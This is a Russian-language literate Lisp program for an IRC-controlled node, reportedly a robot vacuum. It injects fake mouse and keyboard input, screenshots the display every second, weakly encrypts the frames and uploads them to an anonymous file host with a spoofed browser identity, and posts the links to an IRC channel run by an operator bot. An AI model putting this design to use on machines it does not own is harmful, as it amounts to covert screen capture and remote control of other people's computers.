        (error "Integer only for position, (x: ~S, y: ~S)" x y)))

  (defun mklist (obj)
    (if (and
         (listp obj)
         (not (null obj)))
        obj (list obj)))

  (defmacro defun-with-actions (name params actions &body body)
    ;; "This macro defun a function which witch do mouse or keyboard actions,
    ;; body is called on each action."
    `(defun ,name ,params
       (mapcar
        #'(lambda (action)
            ,@body)
        (mklist ,actions))))

  (defun perform-mouse-action (press? button &key x y)
    (and x y (x-move x y))
    (with-default-display-force (d)
      (<<get_property("xtest")>>:fake-button-event d button press?)))

  (defun perform-key-action (press? keycode) ; use xev to get keycode
    (with-default-display-force (d)
      (<<get_property("xtest")>>:fake-key-event d keycode press?)))

  (macrolet ((def (name actions)
               `(defun-with-actions ,name
                    (&key (button 1) x y)
                  ,actions
                  (funcall #'perform-mouse-action
                           action button :x x :y y))))
    (def x-mouse-down t)
    (def x-mouse-up nil)
    (def x-click '(t nil))
    (def x-dbclick '(t nil t nil)))

  (defmacro with-scroll (pos neg clicks x y)
    `(let ((button (cond
                     ((= 0 ,clicks) nil)
                     ((> 0 ,clicks) ,pos)    ; scroll up/right
                     ((< 0 ,clicks) ,neg)))) ; scroll down/left
       (dotimes (_ (abs ,clicks))
         (x-click :button button :x ,x :y ,y))))

  (defun x-vscroll (clicks &key x y)
    (with-scroll 4 5 clicks x y))

  (defun x-scroll (clicks &key x y)
    (x-vscroll clicks :x x :y y))

  (defun x-hscroll (clicks &key x y)
    (with-scroll 7 6 clicks x y))

  (macrolet ((def (name actions)
               `(defun-with-actions ,name (keycode)
                  ,actions
                  (funcall #'perform-key-action
                           action keycode))))
    (def x-key-down t)
    (def x-key-up nil)
    (def x-press '(t nil)))

  ;; (block perform-key-action-test
  ;;   (perform-key-action t 116)
  ;;   (sleep .1)
  ;;   (perform-key-action nil 116))

  ;; (defparameter *mouse-left* 1)

  ;; (defparameter *mouse-middle* 2)

  ;; (block perform-mouse-action-test
  ;;   (perform-mouse-action t *mouse-left* :x 100 :y 100)
  ;;   (sleep .1)
  ;;   (perform-mouse-action nil *mouse-left* :x 100 :y 100))
#+END_SRC

* Snapshot function

Сама функция скриншота должна каждую секунду делать скриншот, загружать
его на файлообменник, получать ссылку на файл и отправлять ее в
irc-канал.

В будущем, когда я добавлю веб-камеру к роботу-пылесосу, такой же процесс
можно будет реализовать и для картинок с неё. Аналогичный процесс
планируется для значений температуры и влажности.

За формирование скриншота отвечает кодовый блок ~x_snapshot~ и
одноименная функция.

Чтобы сократить количество передаваемых данных мы используем несколько
приемов.

Во-первых, мы будем передавать двуцветные черно-белые изображения - по
ним легко визуально распознать то что происходит, но при этом мы можем
тратить только один бит на точку. Мы будем упаковывать по 8 таких бит в
байт и формировать PNG-файл с цветовым пространством 256 градаций
серого. За эту часть работы отвечает ~pack-img~.

:NOTE:

  [TODO:gmm] Возможно, оптимальнее было бы найти способ сохранять
  правильную модель цвета, на это указывает, например вот такой пассаж о
  PNG-формате:

  #+BEGIN_EXAMPLE
    В заголовке IHDR указана ширина и высота, глубина цвета (1,2,4,8 или
    16 бит) и формат пикселя - Grayscale, RGB, Palette, GrayscaleAlpha,
    RGBA, там же тип компрессии (пока что всегда 0: zlib) и тип фильтрации
    (тоже всегда 0, что означает 5 фильтров предикторов None, Sub, Up,
    Average и Paeth, с выбором одного из 5 в начале каждой строки).
  #+END_EXAMPLE

  Но это требует глубже разобраться в PNG-формате, хотя и открывает
  возможности по управлению сжатием и добавлению текстовых данных в
  файлы.

:END:

Второй способ сократить количество передаваемых данных - передавать не
все изображение, а только те точки, в которых оно отличается от
предыдущего переданного изображения.

Однако, в этом случае правильное отображение зависит от того, получил ли
приемник начальное изображение.

Решение состоит в том, чтобы передавать полное изображение (ключевой
кадр) один раз в последовательности из нескольких. Остальные изображения
будут содержать только отличающиеся точки относительно предыдущего
состояния. Несмотря на то, что черные точки тоже передаются -
эксперименты показывают, что PNG эффективно сжимает большие черные
участки.

Важным моментом тут является то, что в общем случае невозможно
гарантировать успех загрузки изображения на файлообменник. В случае сбоя
мы должны в следующий раз пытаться загрузить "ключевой кадр". Для этого
~wrap-img~ возвращает T в случае успеха и NIL - если произошел сбой.

Кроме того, по соображениям безопасности стоит шифровать изображения
после сжатия. Это шифрование нельзя назвать стойким, возможна атака на
открытый текст, так как формат PNG предсказуем. Кроме того, в качестве
ключа мы гамму, генератор которой инициализируется таймштампом узла (в
канале могут быть одновременно несколько узлов).

В общем, шифрование так себе ([TODO:gmm]), но большего пока не требуется
даже для отправляемых узлу комманд, хотя тут и существуют угрозы
безопасности.

#+NAME: shot
#+BEGIN_SRC lisp :noweb yes
  ;; x_snapshot
  <<x_snapshot>>

  ;; pack_image
  <<pack_img>>

  ;; wrap_img
  <<wrap_img>>

  ;; get_img_diff
  (declaim (inline get-img-diff))

  (defun get-img-diff (dims prev snap)
    (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
      (do ((qy 0 (incf qy)))
          ((= qy (car dims)))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx (cadr dims)))
          (declare (type fixnum qx))
          (setf (aref diff qy qx)
                (logxor (aref prev qy qx)
                        (aref snap qy qx)))))
      diff))

  ;; shot
  (let ((prev)
        (cnt 9999))
    (defun shot ()
      (declare (inline get-img-diff))
      (let* ((snap (pack-img (x-snapshot)))
             (dims (array-dimensions snap)))
        (if (> cnt *max-diffs-cnt*)
            (progn ;; key frame
              (wrap-img "~A" dims snap)
              (setf prev snap)
              (setf cnt 0))
            ;; else - diff
            (if (wrap-img (format nil "~~A_~A" cnt) dims
                          (get-img-diff dims prev snap))
                (progn
                  (setf prev snap)
                  (incf cnt))
                ;; else: wrap failure
                (setf cnt 9999))))))
#+END_SRC

** Wrap image

За шифрование изображения, загрузку его на файлообменник, получение
ссылки и отправку её в канал отвечает функция ~wrap-img~. Она выполняет
следующую последовательность операций:
- Формирует PNG-объект из двухмерного массива точек изображения с помощью
  функции ~get-png-obj~.
- Кодирует его в PNG-формат с помощью ~get-png-seq~ получая octets.
- Складывает эти octets c гаммой, с помощью уже знакомой функции
  ~encrypt~, получая base64-string
- Заливает эту base64-string на файлообменник с помощью функции
  ~anon-file-upload~. Здесь возможны варианты - [TODO:gmm] -
  файлообменник может дать сбой, в этом случае следует попытаться
  перезалить файл. Если несколько попыток оказались неудачны - надо
  сделать так, чтобы следующее отправляемое изображение было ключевым
  кадром, а не diff-ом, так как потеряный diff не даст нам возможности
  распознать следующие изображения последовательности.
- Полученную из файлообменника ссылку отправляет в irc-канал. В случае
  ошибки отправляет туда содержание ошибки.

#+NAME: wrap_img
#+BEGIN_SRC lisp :noweb yes
  ;; get_png_obj
  <<get_png_obj>>

  ;; get_png_seq
  <<get_png_seq>>

  ;; anon_file_upload
  <<anon_file_upload>>

  ;; wrap-img
  (defun wrap-img (frmt-filename-str dims image)
    (let* ((height   (car  dims))
           (width    (cadr dims))
           (png      (get-png-obj width height image :grayscale))
           (png-seq  (get-png-seq png))
           (base64   (encrypt png-seq *irc-sess*))
           (filename (format nil frmt-filename-str
                             (format nil "~A" (get-universal-time))))
           (json     "")
           (result   (handler-case
                         (progn
                           (setf json (anon-file-upload filename base64))
                           (cl-json:decode-json-from-string json))
                       (JSON:JSON-SYNTAX-ERROR (err)
                         (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                         (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                         (return-from wrap-img nil))
                       (t (err)
                         (dbg "::wrap-img error: ~A~%" (type-of err))
                         (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                         (return-from wrap-img nil))))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      (if link
          (sendmsg link)
          (sendmsg result))
      t))
#+END_SRC

*** Get PNG object

Функция ~get-png-obj~ вызывается из ~wrap-img~ и возвращает PNG-объект с
содержимым, сформированным из переданного в нее двумерного массива.

#+NAME: get_png_obj
#+BEGIN_SRC lisp
  (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      png))
#+END_SRC

*** Get PNG sequence

Функция ~get-png-seq~ возвращает представление PNG-файла в виде octets.

#+NAME: get_png_seq
#+BEGIN_SRC lisp
  (defun get-png-seq (png)
    (flex:with-output-to-sequence (stream)
      (zpng:write-png-stream png stream)))
#+END_SRC

*** Anon File Upload

#+NAME: anon_file_upload
#+BEGIN_SRC lisp
  ;; (setf drakma:*header-stream* *standard-output*)

  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

  (defparameter *additional-headers*
    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
      ("Accept-Charset" . "utf-8")))

  (defun get-csrf (text)
    (loop :for str :in (split-sequence:split-sequence #\Newline text)
       :do (multiple-value-bind (match-p result)
               (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
             (when match-p (return (aref result 0))))))

  (defun get-cookies-alist (cookie-jar)
    "Получаем alist с печеньками из cookie-jar"
    (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
         (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

  (defun anon-file-upload (filename content)
    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
      ;; load mainpage for cookies, headers and csrf
      (multiple-value-bind (body-or-stream ;; status-code headers uri
                            ;;stream must-close reason-phrase
                            )
          (drakma:http-request "https://anonfile.com/"
                               :user-agent *user-agent*
                               :redirect 10
                               :force-binary t
                               :cookie-jar cookie-jar
                               :additional-headers *additional-headers*)
        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
               (csrf (get-csrf text))
               (boundary "---------------------------196955623314664815241571979859")
               (type-header (format nil "multipart/form-data; boundary=~A" boundary))
               (new-headers `(("Accept" . "application/json")
                              ("Accept-Language" . "en-US,en;q=0.5")
                              ("Cache-Control" . "no-cache")
                              ("X-Requested-With" . "XMLHttpRequest")
                              ("X-CSRF-Token" . ,csrf)
                              ("Origin" . "https://anonfile.com")
                              ("Referer" . "https://anonfile.com/")
                              ("Content-Type" . ,type-header)
                              ("TE" . "Trailers"))))
          (multiple-value-bind (body-or-stream ;; status-code headers uri
                                ;;stream must-close reason-phrase
                                )
              (drakma:http-request
               "https://api.anonfile.com/upload"
               :user-agent *user-agent*
               :method :post
               :form-data t
               :content (format nil "--~A
  Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
  Content-Type: application/octet-stream

  ~A
  --~A--" boundary filename content boundary)
               :cookie-jar cookie-jar
               :additional-headers new-headers
               :force-binary t)
            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
#+END_SRC

** Packing image

Нам нужна функция, для быстрой упаковки изображения. Она не тривиальна.

Мы берем полноцветное изображение и используем два вложенных цикла,
проходя по ~Y~ и ~X~ чтобы обработать каждую точку. После обработки одна
точка должна занимать только один бит.

Мы также должны упаковать по восемь точек в байт, но если размер
изображения в точках не кратен байту, то нужно дополнить недостающие
точки. За это отвечате внутренний макрос ~byte-finiser~, который
вызывается по мере накопления значений в байте и в конце обработки
строки, если это необходимо.

#+NAME: pack_img
#+BEGIN_SRC lisp
  (defun pack-img (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash (logand (+ width 7) (lognot 7)) -3))
           (need-finisher (not (equal new-width (ash width -3))))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8)))
           (bp 8)
           (acc 0))
      (declare (type (unsigned-byte 8) acc)
               (type fixnum bp)
               (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (macrolet ((byte-finisher (acc qy qx bp)
                   `(progn
                      ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                      (setf (aref result ,qy (ash ,qx -3)) ,acc)
                      (setf ,acc 0)
                      (setf ,bp 8))))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (declare (type fixnum qy))
          (do ((qx 0 (incf qx)))
              ((= qx width) (when need-finisher
                              (byte-finisher acc qy qx bp)))
            (declare (type fixnum qx))
            (let* ((avg (floor (+ (aref image qy qx 0)
                                  (aref image qy qx 1)
                                  (aref image qy qx 2))
                               3))
                   (pnt (ash avg -7)))
              (declare (type fixnum avg))
              (declare (type fixnum pnt))
              (decf bp)
              (setf acc (logior acc (ash pnt bp)))
              (when (= bp 0)
                (byte-finisher acc qy qx bp))))
          ;; (format t "~%")
          ))
      result))

  ;; (disassemble 'pack-img)

  ;; TEST: pack-img
  ;; (time
  ;;  (let* ((image (pack-img (x-snapshot)))
  ;;         (dims (array-dimensions image)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              image
  ;;              :grayscale)))
#+END_SRC

** X-Snapshot

Этот раздел описывает библиотечные функции, которые необходимы для
получения снимков экрана

Работа с экраном через ~xlib~:
- Получение размеров экрана
- Получение снимков экрана

После получения размеров экрана мы сохраняем их в глобальные переменные
вида ~default-*~, чтобы после работать с ними напрямую - за это отвечает
вызов функции ~init-defaults~.

При формировании скришота мы перекодируем его функцией
~raw-image->png~. При оптимизации эту перекодировку следует удалить,
чтобы ускорить работу, но пока нам требуется отлаживаемость а не
скорость.

#+NAME: x_snapshot
#+BEGIN_SRC lisp :padline no
  (defmacro with-display (host (display screen root-window) &body body)
    `(let* ((,display (xlib:open-display ,host))
            (,screen (first (xlib:display-roots ,display)))
            (,root-window (xlib:screen-root ,screen)))
       (unwind-protect (progn ,@body)
         (xlib:close-display ,display))))

  (defmacro with-default-display ((display &key (force nil)) &body body)
    `(let ((,display (xlib:open-default-display)))
       (unwind-protect
            (unwind-protect
                 ,@body
              (when ,force
                (xlib:display-force-output ,display)))
         (xlib:close-display ,display))))

  (defmacro with-default-display-force ((display) &body body)
    `(with-default-display (,display :force t) ,@body))

  (defmacro with-default-screen ((screen) &body body)
    (let ((display (gensym)))
      `(with-default-display (,display)
         (let ((,screen (xlib:display-default-screen ,display)))
           ,@body))))

  (defmacro with-default-window ((window) &body body)
    (let ((screen (gensym)))
      `(with-default-screen (,screen)
         (let ((,window (xlib:screen-root ,screen)))
           ,@body))))

  (defun x-size ()
    (with-default-screen (s)
      (values
       (xlib:screen-width s)
       (xlib:screen-height s))))

  (defparameter *default-x* 0)
  (defparameter *default-y* 0)
  (defparameter *default-width* 800)
  (defparameter *default-height* 600)

  (defun init-defaults ()
    (multiple-value-bind (width height)
        (x-size)
      (setf *default-width* width
            ,*default-height* height
            ,*default-x* 0
            ,*default-y* 0)))

  (init-defaults)

  (defun raw-image->png (data width height)
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type :truecolor-alpha
                               :image-data data))
           (data (zpng:data-array png)))
      (dotimes (y height)
        (dotimes (x width)
          ;; BGR -> RGB, ref code: https://goo.gl/slubfW
          ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
          (rotatef (aref data y x 0) (aref data y x 2))
          (setf (aref data y x 3) 255)))
      png))

  (defun x-snapshot (&key (x *default-x*) (y *default-y*)
                       (width  *default-width*) (height *default-height*)
                       path)
    ;; "Return RGB data array (The dimensions correspond to the height, width,
    ;; and pixel components, see comments in x-snapsearch for more details),
    ;; or write to file (PNG only), depend on if you provide the path keyword"
    (with-default-window (w)
      (let ((image
             (raw-image->png
              (xlib:get-raw-image w :x x :y y
                                  :width width :height height
                                  :format :z-pixmap)
              width height)
            ))
        (if path
            (let* ((ext (pathname-type path))
                   (path
                    (if ext
                        path
                        (concatenate 'string path ".png")))
                   (png? (or (null ext) (equal ext "png"))))
              (cond
                (png? (zpng:write-png image path))
                (t (error "Only PNG file is supported"))))
            (zpng:data-array image)))))

  ;; (x-snapshot :path "x-snapshot-true-color.png")
#+END_SRC

* Operator's Loop

Наблюдать за узлом сети и отправлять команды очень увлекательно, но
хочется добавить автоматизации. Например, если глупый робот-пылесос умеет
посылать в канал сообщение о том, что батарея разряжается, то умная
программа-оператор, сидящая в irc-канале может начать с ним диалог, чтобы
довести его до зарядной станции.

Для этого оператору нужно только уметь принимать сообщения и декодировать
отправленные данные. Общая схема работы будет такая же как у супервизора:
используем ~operator-loop~ и ~watchdog-timer~, чтобы циклически вызывать
функцию из глобальной переменной ~*operator*~.

Каждую секунду ~operator-loop~ инкрементирует состояние переменной
~watchdog-timer~ и вызывает ~operator~. Внутри себя ~operator~ использует
значение этой переменной, чтобы отслеживать зависшие потоки и завершать
их.

#+NAME: operator_loop
#+BEGIN_SRC lisp :noweb yes
  <<debug>>

  (defparameter *watchdog-timer* 0)

  (defparameter *operator-stop-flag* nil)

  (defparameter *sleep-interval* 3)

  <<operator>>

  (defun operator-loop ()
    (setf *watchdog-timer* 0)
    (tagbody
     infinite
       (when *operator-stop-flag*
         (go end))
       (dbg ":operator-loop WGD=~3,'OD~%" *watchdog-timer*)
       (funcall *operator*)
       (sleep *sleep-interval*)
       (incf *watchdog-timer*)
       (go infinite)
     end))

  (operator-loop)
#+END_SRC

** Operator

Оператор работает с потоками ~op-irc-th~, задача которых - обрабатывать
сообщения, которые приходят из IRC-канала. Эти потоки могут зависнуть
попав в необработанную ошибку или при сбое сети, поэтому оператор должен
минимизировать ущерб от таких зависаний. В норме мы считаем, что должен
работать один поток ~op-irc-th~.

Вторая задача оператора - осуществлять управление потоками, которые
выполняют задачи. Эти задачи возникают, когда из IRC-канала приходят
сообщения. В общем случае в для обработки каждого сообщения может
создаваться свой поток, при этом в силу (возможно) нестабильной работы
сети, часть из этих потоков может зависать. Это не должно сказываться на
роботоспособности всей программы.

Оператору для работы потребуются вспомогательные функции, которые:
- ищут потоки по их именам
- завершают поток
- очищают список потоков от тех, что уже завершены

Поэтому мы можем определить рамочную функцию здесь, а куски кода, которые
выполняют логику работы с разными типами потоков доопределить ниже в этом
же разделе.

#+NAME: operator
#+BEGIN_SRC lisp :noweb yes
  (defparameter *watchdog-timer-max* 100)

  (defparameter *task-th-stop-flag* nil)

  (defparameter *op-irc-th-stop-flag* nil)

  (defparameter *op-connection-established-flag* nil)

  (defparameter *op-irc-threads* nil)

  (defparameter *max-task-thread-cnt* 30)

  (defparameter *task-threads* nil)

  (defparameter *max-task-thread-life-time* 5)

  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  <<queues>>

  <<op_irc>>

  <<task_function>>

  (defparameter *operator*
    (lambda ()
      (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                                 (bt:all-threads))))
        (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                :do (when (equal name nm)  (return th))))
                 (kill (th)  (handler-case (bt:destroy-thread th)
                               ;; happens, when thread destroyed already
                               (TYPE-ERROR () nil)))
                 (kill-op-irc (th)
                   (kill th)
                   (setf *watchdog-timer* 0)
                   (setf *op-connection-established-flag* nil))
                 (clear ()
                   (bt:with-recursive-lock-held (*thread-operations-lock*)
                     (setf *task-threads*
                           (remove-if-not #'(lambda (pair)
                                              (bt:thread-alive-p (car pair)))
                                          ,*task-threads*)))))
          <<op_irc_th_management>>
          <<tasks_th_management>>
          ))))
#+END_SRC

*** op-irc-th management

Если отсутствуют потоки ~op-irc-th~ оператор будет пытаться создать один,
и реинициализировать ~watchdog-timer~.

Если хотя бы один поток ~op-irc-th~ существует, но значение
~watchdog-timer~ слишком велико - он будет убит, потому что, вероятно, он
завис. Ведь независший поток сбрасывал бы ~watchdog-timer~ каждый раз
выполняя какую-либо операцию, например, получая сообщение.

Если значение ~watchdog-timer~ продолжает оставаться слишком большим,
т.е. никакой из зависший потоков не подал признаки жизни, то при
следующем запуске ~operator~ будет убит следующий поток.

И так далее, пока потоков ~op-irc-th~ не останется (или один из оживших
потоков ~op-irc-th~ не обнулит таймер - например при приходе
сообщения).

Когда все потоки будут уничтожены оператор будет пытаться создавать
новые, сводя задачу к известной.

Так мы обеспечиваем попытки перезапуска, уничтожая все потоки когда
~watchdog-timer~ перестает обновляться и избегая ситуации, когда в канале
одновременно больше одного независшего потока.

#+NAME: op_irc_th_management
#+BEGIN_SRC lisp :noweb yes
  ;; if there is no irs-thread then start it
  (when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
             (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
    (dbg "::operator lambda: start irc-th~%")
    (setf *watchdog-timer* 0)
    (bt:make-thread
     #'op-irc :name "op-irc-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*op-irc-thread-stop-flag* . ,*op-irc-th-stop-flag*))))
  ;; if there is irc-thread, but the watchdog-timer exceeds
  ;; or the flag is set - then kill it.
  (awhen (fnd "op-irc-th")
    (when (> *watchdog-timer*  *watchdog-timer-max*)
      (dbg "::operator-lambda: kill op-irc-th by WDG~%")
      (kill-op-irc it))
    (when *op-irc-th-stop-flag*
      (dbg "::operator-lambda: kill op-irc-th by FLAG~%")
      (kill-op-irc it)))
#+END_SRC

*** Task's threads management

Мы получаем задачи из очереди, которая будет определена в одном из
разделов ниже. В первую очередь, необходимо следить, чтобы количество
рабочих потоков не было слишком большим, убивая потоки, которые дольше
всех работают. Мы считаем, что никакой поток не должен работать более
~max-task-thread-life-time~ секунд. Если он работает дольше - мы можем
это позволить только если система не перегружена, т.е. общее количество
потоков меньше ~max-task-thread-cnt~.

#+NAME: kill_slow_task_threads
#+BEGIN_SRC lisp :noweb yes
  (when (> (length *task-threads*) *max-task-thread-cnt*)
    (dbg "::operator-lambda: many task threads~%")
    (loop :for (task-th . time) :in *task-threads* :do
         (dbg "~A . ~A~%" task-th time)
         (when (> (- (get-universal-time) time)
                  ,*max-task-thread-life-time*)
           (dbg "::operator-lambda: kill task-th by lifetime exceed~%")
           (kill task-th)))
    (clear))
#+END_SRC

Кроме того, по идее, необходимо следить, [TODO:gmm] чтобы очередь не
переполнялась, но я пока не решил, как именно лучше делать - прекратить
ли принимать новые задачи или удалять старые: по идее все приходящие
задачи для нас одинаково важны.

Переходим к выполнению задач.

Если очередь не пуста, то было бы неплохо вынуть из нее несколько задач и
для каждой из них запустить поток. [TODO:gmm] Но пока я запускаю по одной
задаче на итерацию.

#+NAME: start_task_thread
#+BEGIN_SRC lisp :noweb yes
  (when (< 0 (length-of-queue))
    (let* ((current-task (pop-task))
           (bindings `((*standard-output* . ,*standard-output*)
                       (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                       (*current-task* . ,current-task)
                       (*op-sess* . ,*op-sess*)
                       (*op-user* . ,*op-user*)
                       (*op-serv* . ,*op-serv*)
                       (*op-chan* . ,*op-chan*)
                       (*op-lock* . ,*op-lock*)
                       (*op-conn* . ,*op-conn*)
                       (*watchdog-timer* . ,*watchdog-timer*))))
      (bt:with-recursive-lock-held (*thread-operations-lock*)
        (push (cons (bt:make-thread #'task :name "task-th"
                                    :initial-bindings bindings)
                    (get-universal-time))
              ,*task-threads*))))
#+END_SRC

Собственно функция ~TASK~, которая выполняет задачу, будет описана в
соответствуюшщем разделе.

Собираем все вместе:

#+NAME: tasks_th_management
#+BEGIN_SRC lisp :noweb yes
  <<kill_slow_task_threads>>
  <<start_task_thread>>
#+END_SRC

** Operator's Irc Thread Function

Когда оператор создает новый поток в качестве функции потока он указывает
~op-irc~. Задачи этой функции:
- создать соединение с IRC-сервером
- обнулить ~watchdog-timer~
- запустить ~op-loop~ для обработки сообщений IRC

Если нет подключения к сети мы получим ошибку
~USOCKET:NS-TRY-AGAIN-CONDITION~, которая будет проигнорирована, но
записана в лог, как и любые другие ошибки подключения. В этих случаях
функция ~op-loop~ не будет вызвана, произойдет выход их функции потока и
поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит
его и это приведет к следующей попытке подключения.

#+NAME: op_irc
#+BEGIN_SRC lisp :noweb yes
  (defparameter *op-sess* nil)
  (defparameter *op-user* nil)
  (defparameter *op-serv* "irc.freenode.org")
  (defparameter *op-chan* "#nvrtlessfndout")
  (defparameter *op-lock* (bt:make-recursive-lock "op-lock"))
  (defparameter *op-conn* nil)

  <<op_loop>>

  (defun op-irc ()
    "operator's irc thread func"
    (setf *op-sess* (get-universal-time))
    (setf *op-user* (format nil "op~A" *op-sess*))
    (setf *op-conn*
          (handler-case
              (cl-irc:connect :nickname *op-user* :server *op-serv*)
            (USOCKET:NS-TRY-AGAIN-CONDITION (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)
            (t (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)))
    (when *op-conn*
      (dbg "::op irc conn:~A~%" *op-conn*)
      (setf *watchdog-timer* 0)
      (op-loop)))
#+END_SRC

** Operator's Loop

На этом месте текущий поток должен запустить поток-помошник, который
инжектирует хук, подключитья к каналу и установит
~op-connection-established-flag~.

Запустив этот поток, можно сразу же зациклиться читая сообщения - дальше
будут работать установленные хуки. Они будут вызываться в контексте
текущего потока, асинхронно, из функции пакета ~cl-irc~.

#+NAME: op_loop
#+BEGIN_SRC lisp :noweb yes
  <<op_helper>>

  (defun op-loop ()
    (bt:make-thread
     #'op-helper :name "op-helper-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*op-sess* . ,*op-sess*)
       (*op-user* . ,*op-user*)
       (*op-serv* . ,*op-serv*)
       (*op-chan* . ,*op-chan*)
       (*op-lock* . ,*op-lock*)
       (*op-conn* . ,*op-conn*)))
    (handler-case (cl-irc:read-message-loop *op-conn*)
      (SB-INT:SIMPLE-STREAM-ERROR (err)
        (dbg "::op-loop error: ~A~%" (type-of err)))
      ;; (t (err)
      ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
      ))
#+END_SRC

*** Operator's helper thread

Поток-помошник занимается только тем, что устанавливает хук, джоинится в
канал и отправляет приветственное сообщение о том что он в канале.

#+NAME: op_helper
#+BEGIN_SRC lisp :noweb yes
  (defmacro sendmsg (msg &rest params)
    `(bt:with-recursive-lock-held (*op-lock*)
       (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

  ;; op-hook
  <<op_hook>>

  (defun op-helper ()
    (sleep 1)
    (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
    (sleep 1)
    (bt:with-recursive-lock-held (*op-lock*)
      (cl-irc:join *op-conn* *op-chan*))
    (sleep 1)
    (bt:with-recursive-lock-held (*op-lock*)
      (setf *op-connection-established-flag* t))
    (sendmsg "op here"))
#+END_SRC

** Operator's Message Hook

Собственно хук, который обрабатывает приходящие в канал сообщения. Он
вынесен в глобальную переменную для удобства замены на лету.

Чтобы предотвратить последующую обработку процедура хука должна
возвращать T.

#+NAME: op_hook
#+BEGIN_SRC lisp :noweb yes
  ;; op_cmd_proc
  <<op_cmd_proc>>

  (defun op-msg-hook (param)
    "MUST return T for stop hooks processing"
    (funcall *op-cmd* param)
    t)
#+END_SRC

** Rule-based Command Processor

Ну вот, теперь осталось правильно реагировать на команды. Чтобы
распознать команду мы будем применять диспетчер, работающий как система
правил. Он опирается на список правил, каждая из которых представляет
пару (условие . действие).

Правила должны иметь возможность делать что-то асинхронно, для этого мы
подключаем механизм очередей.

#+NAME: op_cmd_proc
#+BEGIN_SRC lisp :noweb yes
  <<shot_rule>>

  (defparameter *op-rules*
    (list (cons #'shot-rule-antecedent #'shot-rule-consequent)))

  (defparameter *op-cmd*
    (lambda (param)
      (block op-cmd-block
        (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
               (src  (CL-IRC:SOURCE param))
               ;; (oct  (decrypt msg *op-sess*))
               ;; (str  (handler-case
               ;;           (flex:octets-to-string oct :external-format :utf-8)
               ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
               (str msg)
               )
          (dbg "~A: ~A~%" src str)
          (block op-rules-dispatcher
            (let ((applyed_rules 0))
              (loop :for (antecedent . consequent) :in *op-rules* :do
                   (when (funcall antecedent str src)
                     (incf applyed_rules)
                     (when (funcall consequent str src)
                       (return-from op-rules-dispatcher nil))))
              (when (> 0 applyed_rules)
                (dbg "::UNKMSG [~A] from [~A]~%" str src))
              (finish-output)))
          ))))
#+END_SRC

** Shot Rule

Правило для скриншотов просто проверяет сообщение на соответствие
регулярному выражению. Если есть совпадение - мы должны как минимум
скачать и сохранить данные.

Однако, скачивание может наткнуться на сбой сети и зависнуть, и в этом
случае хук никогда не завершиться и соответственно зависнет цикл чтения
IRC-сообщений, потому что хук выполняется в его контексте. Поэтому вместо
того, чтобы начать скачивание и обработку - мы делаем отложенную задачу и
помещаем её в очередь.

#+NAME: shot_rule
#+BEGIN_SRC lisp :noweb yes
  (defun shot-rule-antecedent (str src)
    (declare (ignore src))
    (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

  (defun shot-rule-consequent (str src)
    (dbg ":: (~A)ins-task ~A | ~A~%"
         (length-of-queue) str src)
    (ins-task (make-task :class 'task
                         :data (list str src)
                         :code #'identity)))

  ;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
#+END_SRC

** Queues

Когда мы скачиваем файл с файлообменника - это может окончиться
неудачей. В этом случае удобно обрабатывать такие сбои в CPS-стиле,
